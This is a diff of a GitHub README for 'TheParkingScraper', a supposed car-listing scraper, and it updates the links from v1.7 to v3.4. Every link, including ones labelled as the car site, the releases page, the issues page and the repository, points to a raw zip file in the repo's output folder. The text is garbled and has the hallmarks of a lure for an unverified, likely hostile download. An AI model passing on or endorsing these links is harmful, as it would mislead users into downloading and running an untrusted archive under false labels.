@@ -1,16 +1,16 @@
 # 🚗 TheParkingScraper - Easily Access Car Listings
 
 ## 🌟 Description
-TheParkingScraper is a simple tool that helps you find car listings from https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip using the ScrapingAnt API. This application gathers data so you can see what's available in the European car marketplace without any hassle.
+TheParkingScraper is a simple tool that helps you find car listings from https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip using the ScrapingAnt API. This application gathers data so you can see what's available in the European car marketplace without any hassle.
 
 ## 📦 Download Now
-[![Download TheParkingScraper](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip%https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip)](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip)
+[![Download TheParkingScraper](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip%https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip)](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip)
 
 ## 🚀 Getting Started
 To get started with TheParkingScraper, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip) to find the latest version of the software.
+   Go to our [Releases page](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip) to find the latest version of the software.
 
 2. **Download the Software**
    On the Releases page, look for the version that you want to download. Click on the link for that version to download the file. 
@@ -38,7 +38,7 @@ TheParkingScraper includes several features to enhance your experience:
 - **Custom Search Options:** Filter results based on your preferences, like price and location.
 
 ## 📋 Download & Install
-To download and install TheParkingScraper, go to our [Releases page](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip). Follow the above steps to download the software and complete the installation.
+To download and install TheParkingScraper, go to our [Releases page](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip). Follow the above steps to download the software and complete the installation.
 
 ## 📖 Usage Tips
 - **Initial Setup:** When you first open TheParkingScraper, it may prompt you for some settings. Follow the on-screen instructions to set it up.
@@ -53,7 +53,7 @@ If you encounter any issues while using TheParkingScraper, consider the followin
 2. **Restart the Application:** Sometimes a simple restart can resolve issues.
 3. **Reinstall:** If problems persist, uninstall the application and install it again from the Releases page.
 
-For further assistance, you can check the [GitHub Issues page](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip) for common problems or solutions.
+For further assistance, you can check the [GitHub Issues page](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip) for common problems or solutions.
 
 ## 🤝 Contribution
 We welcome contributions from users. If you believe you can enhance the application, feel free to fork the repository on GitHub and submit a pull request.
@@ -62,7 +62,7 @@ We welcome contributions from users. If you believe you can enhance the applicat
 Join our community discussions in the Issues section. Share your experiences, provide feedback, and engage with other users to improve TheParkingScraper.
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper-The-Parking-v1.7.zip)
+- [GitHub Repository](https://github.com/AtychiUnavailable/TheParkingScraper/raw/refs/heads/main/output/Scraper_The_Parking_v3.4.zip)
 - [Documentation](https://link-to-documentation)
 - [Support](https://link-to-support)
 
